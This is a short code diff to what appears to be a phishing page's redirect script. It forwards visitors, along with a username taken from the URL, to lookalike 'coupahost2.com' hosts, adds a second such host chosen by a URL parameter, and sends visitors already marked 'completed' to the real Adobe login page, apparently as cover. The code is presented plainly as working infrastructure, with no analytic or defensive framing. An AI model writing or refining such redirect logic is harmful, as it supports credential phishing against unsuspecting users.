@@ -3,6 +3,19 @@
   const qs = window.location.search;
   const urlParams = new URLSearchParams(qs);
 
+  const targetDomains = [
+    "https://documents.coupahost2.com",
+    "https://marshall.coupahost2.com"
+  ]
+
+  let targetDomain;
+
+  if (urlParams.has("au")) {
+    targetDomain = targetDomains[1];
+  } else {
+    targetDomain = targetDomains[0];
+  }
+
   // if the cookie is set, redirect 
   if (localStorage.getItem("completed")) {
     window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
@@ -20,9 +33,9 @@
 
         if (urlParams.has("u")) {
           const u = urlParams.get("u");
-          window.location = "https://documents.coupahost2.com/?username=" + u;
+          window.location = targetDomain + "?username=" + u;
         } else {
-          window.location = "https://documents.coupahost2.com"
+          window.location = targetDomain;
         }
       } 
 
